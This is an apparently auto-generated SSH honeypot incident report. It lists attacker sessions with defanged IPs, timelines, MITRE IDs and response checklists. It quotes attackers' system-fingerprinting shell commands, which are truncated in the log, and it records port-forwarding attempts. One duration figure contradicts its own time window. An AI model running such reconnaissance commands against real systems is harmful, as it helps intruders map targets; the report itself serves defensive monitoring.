| **First Seen** | 2026-08-16 16:37 |
| **Last Seen** | 2026-08-16 16:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:37:56` | `cowrie.session.connect` |
| `2026-08-16 16:37:57` | `cowrie.client.version` |
| `2026-08-16 16:37:57` | `cowrie.client.kex` |
| `2026-08-16 16:38:00` | `cowrie.login.success` |
| `2026-08-16 16:38:01` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8724eb811d31

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-08-16 16:38 |
| **Last Seen** | 2026-08-16 16:43 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:38:07` | `cowrie.session.connect` |
| `2026-08-16 16:38:07` | `cowrie.client.version` |
| `2026-08-16 16:38:07` | `cowrie.client.kex` |
| `2026-08-16 16:38:09` | `cowrie.login.success` |
| `2026-08-16 16:38:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2166f6ceb52e

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 16:39 |
| **Last Seen** | 2026-08-16 16:39 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:39:06` | `cowrie.session.connect` |
| `2026-08-16 16:39:12` | `cowrie.client.version` |
| `2026-08-16 16:39:12` | `cowrie.client.kex` |
| `2026-08-16 16:39:38` | `cowrie.login.success` |
| `2026-08-16 16:39:50` | `cowrie.session.params` |
| `2026-08-16 16:39:50` | `cowrie.command.input` |
| `2026-08-16 16:39:57` | `cowrie.log.closed` |
| `2026-08-16 16:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df65c37830b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:39 |
| **Last Seen** | 2026-08-16 16:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:39:13` | `cowrie.session.connect` |
| `2026-08-16 16:39:13` | `cowrie.client.version` |
| `2026-08-16 16:39:13` | `cowrie.client.kex` |
| `2026-08-16 16:39:15` | `cowrie.login.success` |
| `2026-08-16 16:39:17` | `cowrie.session.params` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.success` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:17` | `cowrie.command.input` |
| `2026-08-16 16:39:18` | `cowrie.log.closed` |
| `2026-08-16 16:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef2f258c32e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:41 |
| **Last Seen** | 2026-08-16 16:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:41:10` | `cowrie.session.connect` |
| `2026-08-16 16:41:10` | `cowrie.client.version` |
| `2026-08-16 16:41:10` | `cowrie.client.kex` |
| `2026-08-16 16:41:13` | `cowrie.login.success` |
| `2026-08-16 16:41:14` | `cowrie.session.params` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.success` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:14` | `cowrie.command.input` |
| `2026-08-16 16:41:15` | `cowrie.log.closed` |
| `2026-08-16 16:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e67500ce4512

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:43 |
| **Last Seen** | 2026-08-16 16:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:43:03` | `cowrie.session.connect` |
| `2026-08-16 16:43:04` | `cowrie.client.version` |
| `2026-08-16 16:43:04` | `cowrie.client.kex` |
| `2026-08-16 16:43:06` | `cowrie.login.success` |
| `2026-08-16 16:43:08` | `cowrie.session.params` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.success` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:08` | `cowrie.command.input` |
| `2026-08-16 16:43:09` | `cowrie.log.closed` |
| `2026-08-16 16:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e734f73eb43

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:44 |
| **Last Seen** | 2026-08-16 16:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:44:56` | `cowrie.session.connect` |
| `2026-08-16 16:44:56` | `cowrie.client.version` |
| `2026-08-16 16:44:56` | `cowrie.client.kex` |
| `2026-08-16 16:44:58` | `cowrie.login.success` |
| `2026-08-16 16:45:00` | `cowrie.session.params` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.success` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:00` | `cowrie.command.input` |
| `2026-08-16 16:45:01` | `cowrie.log.closed` |
| `2026-08-16 16:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eae710572d6c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:46 |
| **Last Seen** | 2026-08-16 16:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:46:46` | `cowrie.session.connect` |
| `2026-08-16 16:46:46` | `cowrie.client.version` |
| `2026-08-16 16:46:46` | `cowrie.client.kex` |
| `2026-08-16 16:46:48` | `cowrie.login.success` |
| `2026-08-16 16:46:50` | `cowrie.session.params` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.success` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.command.input` |
| `2026-08-16 16:46:50` | `cowrie.log.closed` |
| `2026-08-16 16:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf462bed43e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:48 |
| **Last Seen** | 2026-08-16 16:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:48:39` | `cowrie.session.connect` |
| `2026-08-16 16:48:40` | `cowrie.client.version` |
| `2026-08-16 16:48:40` | `cowrie.client.kex` |
| `2026-08-16 16:48:42` | `cowrie.login.success` |
| `2026-08-16 16:48:43` | `cowrie.session.params` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.success` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:43` | `cowrie.command.input` |
| `2026-08-16 16:48:44` | `cowrie.log.closed` |
| `2026-08-16 16:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95716ca2c67a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:50 |
| **Last Seen** | 2026-08-16 16:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:50:35` | `cowrie.session.connect` |
| `2026-08-16 16:50:36` | `cowrie.client.version` |
| `2026-08-16 16:50:36` | `cowrie.client.kex` |
| `2026-08-16 16:50:38` | `cowrie.login.success` |
| `2026-08-16 16:50:39` | `cowrie.session.params` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.success` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:39` | `cowrie.command.input` |
| `2026-08-16 16:50:40` | `cowrie.log.closed` |
| `2026-08-16 16:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9661489fc956

| Field | Detail |
|---|---|
| **Source IP** | `14.33.93[.]214` |
| **First Seen** | 2026-08-16 16:51 |
| **Last Seen** | 2026-08-16 16:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:51:18` | `cowrie.session.connect` |
| `2026-08-16 16:51:19` | `cowrie.client.version` |
| `2026-08-16 16:51:19` | `cowrie.client.kex` |
| `2026-08-16 16:51:22` | `cowrie.login.success` |
| `2026-08-16 16:51:23` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.93[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.33.93[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e733490a5a8

| Field | Detail |
|---|---|
| **Source IP** | `31.173.29[.]136` |
| **First Seen** | 2026-08-16 16:51 |
| **Last Seen** | 2026-08-16 16:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:51:29` | `cowrie.session.connect` |
| `2026-08-16 16:51:30` | `cowrie.client.version` |
| `2026-08-16 16:51:30` | `cowrie.client.kex` |
| `2026-08-16 16:51:32` | `cowrie.login.success` |
| `2026-08-16 16:51:33` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.29[.]136` to AbuseIPDB if not already reported
- [ ] Block `31.173.29[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139792dd3df2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:52 |
| **Last Seen** | 2026-08-16 16:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:52:35` | `cowrie.session.connect` |
| `2026-08-16 16:52:35` | `cowrie.client.version` |
| `2026-08-16 16:52:35` | `cowrie.client.kex` |
| `2026-08-16 16:52:37` | `cowrie.login.success` |
| `2026-08-16 16:52:38` | `cowrie.session.params` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.success` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:38` | `cowrie.command.input` |
| `2026-08-16 16:52:39` | `cowrie.log.closed` |
| `2026-08-16 16:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-264af30ec8a2

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 16:54 |
| **Last Seen** | 2026-08-16 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:54:12` | `cowrie.session.connect` |
| `2026-08-16 16:54:12` | `cowrie.client.version` |
| `2026-08-16 16:54:12` | `cowrie.client.kex` |
| `2026-08-16 16:54:13` | `cowrie.login.success` |
| `2026-08-16 16:54:14` | `cowrie.session.params` |
| `2026-08-16 16:54:14` | `cowrie.command.input` |
| `2026-08-16 16:54:14` | `cowrie.log.closed` |
| `2026-08-16 16:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c9e333637f6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:54 |
| **Last Seen** | 2026-08-16 16:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:54:37` | `cowrie.session.connect` |
| `2026-08-16 16:54:37` | `cowrie.client.version` |
| `2026-08-16 16:54:37` | `cowrie.client.kex` |
| `2026-08-16 16:54:39` | `cowrie.login.success` |
| `2026-08-16 16:54:40` | `cowrie.session.params` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.success` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.command.input` |
| `2026-08-16 16:54:40` | `cowrie.log.closed` |
| `2026-08-16 16:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **4148** | 2026-08-16 14:55 | 2026-08-16 16:55 | 4953m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **45** | 2026-08-16 15:07 | 2026-08-16 16:54 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **12** | 2026-08-16 14:59 | 2026-08-16 16:41 | 9m | 0 | `T1592` | 🟠 MEDIUM |
